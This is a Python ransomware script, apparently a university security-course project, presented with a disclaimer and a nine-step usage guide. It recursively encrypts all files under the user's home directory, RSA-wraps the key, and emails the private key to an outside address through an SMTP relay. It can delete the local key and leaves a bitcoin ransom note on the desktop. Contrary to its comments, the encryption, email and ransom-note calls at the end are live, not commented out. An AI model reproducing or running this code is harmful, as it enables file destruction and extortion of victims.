#################################
#################################
####group_18_ransomware.py#######
####Group 18###Prof. Tunc###UNT##
####CSCE 5550####FA22############
#################################
#################################
# Disclaimer: Ransomware is ILLEGAL. Do not run in production environments.
# This ransomware program was built for educational purposes as part of a research project. If you use
# this then it is at your own risk.
#
# Author: cjd0125 //dogthebountycoder
# Version 1.2 11/18/2022
#######################################################################################################################
#######################################################################################################################
# Instructions:
# Step 1: CHANGE GLOBAL VARIABLES FOR DIRECTORY USE (IF YOU WANT DIFFERENT DIRECTORIES)
#
# Step 2: Run generate_fernet_key(). Key is placed into directory used in Step 1
#
# Step 3: Run generate_rsa_keys(). Keys are placed into directory used in Step 1
#
# Step 4: Run filesarray = get_files() &
# encrypt_fernet(filesarray, FERNET_KEY_LOCATION+'fernetKey.key')
# These functions get the directory provided recursively. Then encryptes each file with the fernetKey.key
#
# Step 5: Run encrypt_rsa(). This will encrypt the fernetKey.key with the publicKey.pem in the directory from step 1.
#
# Step 6: Run send_privkey(). This sends the private key plain text to the email address provided in step 1.
#
# Step 7: Run delete_private_key(). This deletes the private key. Only do this after the send_privkey() has been run.
# otherwise your files are gone forever.
#
# Step 8: Run create_ransom_message(). This creates an index.html on the desktop displaying ransom message. Edit this to
# say what you want. Make sure you change the directory from step 1 so it will create the file in the right place.
#
# Step 9: Run decrypt_rsa()
# decrypt_fernet(filesarray, FERNET_KEY_LOCATION+'fernetKey.key')
# These will, in order, decrypt the fernet key, then decrypt each file in directory. BUT, the privateKey.pem will
# need to be re-created if you ran delete_private_key() in Step 7. If you want to decrypt without having to create
# the new privateKey.pem then comment out Step 7.
##########################################################################################################################

import glob
import os
import rsa
from cryptography.fernet import Fernet
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


######################################################################################################
###############Globals - EDIT these to your location to encrypt and store keys########################
######################################################################################################

# Step 1:
FERNET_KEY_LOCATION = '/home/'  # OPTIONAL - CHANGE TO KEY DIRECTORY
RSA_KEY_LOCATION = '/home/'  # OPTIONAL - CHANGE TO KEY DIRECTORY
#
ENCRYPTION_PATH = os.path.expanduser('~') + '/'  # OPTIONAL - CHANGE TO Encryption Directory
DESKTOP_DIRECTORY = os.path.expanduser('~') + '/Desktop/'
SENDER_EMAIL = 'EMAIL'  # CHANGE TO SENDER EMAIL
RECEIVER_EMAIL = 'EMAIL'  # CHANGE TO RECEIVER EMAIL


######################################################
####Functions###Should Not Need Editing###############
######################################################

# get_files uses glob to retrieve and create an array for the file locations
def get_files():
    f_array = [f for f in glob.glob(ENCRYPTION_PATH + "**/*.*", recursive=True)]
    return f_array


# generate the symmetrical key and store it somewhere
def generate_fernet_key():
    fernet_key = Fernet.generate_key()
    with open(FERNET_KEY_LOCATION + 'fernetKey.key', 'wb') as fkey:
        fkey.write(fernet_key)


# generate the asymmetrical keys
def generate_rsa_keys():
    (public_key, private_key) = rsa.newkeys(2048)
    with open(RSA_KEY_LOCATION + 'publicKey.pem', "wb") as key:
        key.write(public_key.save_pkcs1("PEM"))
    with open(RSA_KEY_LOCATION + 'privateKey.pem', "wb") as key:
        key.write(private_key.save_pkcs1("PEM"))


# load rsa keys
# read each key and return both keys for encrypt rsa function
def rsa_load_keys():
    with open(RSA_KEY_LOCATION + 'publicKey.pem', 'rb') as k:
        publicKey = rsa.PublicKey.load_pkcs1(k.read())
    with open(RSA_KEY_LOCATION + 'privateKey.pem', 'rb') as k:
        privateKey = rsa.PrivateKey.load_pkcs1(k.read())
    return publicKey, privateKey


# encrypt files with fernet (speedy fast)
def encrypt_fernet(file_array, fernet_key):
    # read the fernet key
    with open(fernet_key, 'rb') as encrypt_key:
        f_key = encrypt_key.read()
    fernet = Fernet(f_key)
    # loop through each file name
    for f in file_array:
        # read the original file
        with open(f, 'rb') as original_file:
            original_text = original_file.read()
        # encrypt the file
        encrypted_text = fernet.encrypt(original_text)
        # write the encrypted file
        with open(f, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_text)


# decrypt the files, provide file array, fernet key
def decrypt_fernet(file_array, fernet_key):
    # read the fernet key
    with open(fernet_key, 'rb') as encrypt_key:
        f_key = encrypt_key.read()
    fernet = Fernet(f_key)
    # loop through encrypted files
    for f in file_array:
        with open(f, 'rb') as encrypted_file:
            encrypted_text = encrypted_file.read()
        # decrypt the text
        decrypted_text = fernet.decrypt(encrypted_text)
        # write the decrypted text back to file
        with open(f, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_text)


# Encrypt the fernetKey with RSA Public Key
def encrypt_rsa():
    pubKey, privKey = rsa_load_keys()
    with open(FERNET_KEY_LOCATION + 'fernetKey.key', 'rb') as k:
        fKey = k.read()
    rsa_encrypted = rsa.encrypt(fKey, pubKey)
    with open(FERNET_KEY_LOCATION + 'fernetKey.key', 'wb') as k:
        k.write(rsa_encrypted)


def decrypt_rsa():
    pubKey, privKey = rsa_load_keys()
    with open(FERNET_KEY_LOCATION + 'fernetKey.key', 'rb') as o:
        encrypted_key = o.read()
    decrypted_key = rsa.decrypt(encrypted_key, privKey)
    with open(FERNET_KEY_LOCATION + 'fernetKey.key', 'wb') as o:
        o.write(decrypted_key)


# send privKey in email
def send_privkey():
    # Set up email headers
    sub = "Group 18 Private Key"
    body = open(RSA_KEY_LOCATION + 'privateKey.pem', 'r').read()
    s_email = SENDER_EMAIL # INPUT SENDER EMAIL
    r_email = RECEIVER_EMAIL # INPUT RECEIVING EMAIL

    # Set up message contents
    message = MIMEMultipart()
    message["From"] = s_email
    message["To"] = r_email
    message["Subject"] = sub
    message.attach(MIMEText(body, "plain"))

    # Set message as string for plain text delivery
    txt = message.as_string()

    # smtp objects for deliver, relay , etc.
    smtpObj = smtplib.SMTP('relay.appriver.com', 2525)  # use any relay you wish or keep default relay.appriver.com 2525
    smtpObj.sendmail(s_email, r_email, txt)


# delete privKey off client
def delete_private_key():
    os.remove(RSA_KEY_LOCATION + 'privateKey.pem')


# create ransom message on the desktop
def create_ransom_message():
    message = "Your files are held hostange. Pay the ransom now! $1,000,000 in bitcoin to my address please. Thanks - //Group18"
    with open(DESKTOP_DIRECTORY + 'Ransom.txt', 'w') as f:  # CHANGE DESKTOP DIRECTORY TO USERS DIRECTORY.
        f.write(message)
##########################################
##########End Functions###################
##########################################

###EACH OF THE BELOW STEPS IS COMMENTED OUT ON
###PURPOSE SO YOU DO NOT ENCRYPT YOUR OWN PC ON ACCIDENT AND REQUIRES
###MANUAL ENGAGEMENT.###

### COMMENT EACH STEP OUT ONE AT A TIME SO YOU CAN WATCH EACH STEP WORK.###
### WHEN YOU ARE READY FOR USE, YOU MAY UNCOMMENT THEM ALL SO IT WORKS ON ONE RUN.###

# Step 2:
generate_fernet_key()

# Step 3:
generate_rsa_keys()

# Step 4:
filesarray = get_files()
encrypt_fernet(filesarray, FERNET_KEY_LOCATION+'fernetKey.key')

# Step 5:
encrypt_rsa()

# Step 6:
send_privkey()

# Step 7: COMMENT THIS OUT IF YOU WANT TO KEEP THE PRIVATE KEY FOR TESTING OTHERWISE IT WILL BE DELETED AND YOU WILL ###
# HAVE TO REBUILD THE PRIVATE KEY FILE FROM THE TEXT IN EMAIL ###
# delete_private_key()

# Step 8:
create_ransom_message()

# Step 9:
# decrypt_rsa()
# decrypt_fernet(filesarray, FERNET_KEY_LOCATION+'fernetKey.key')
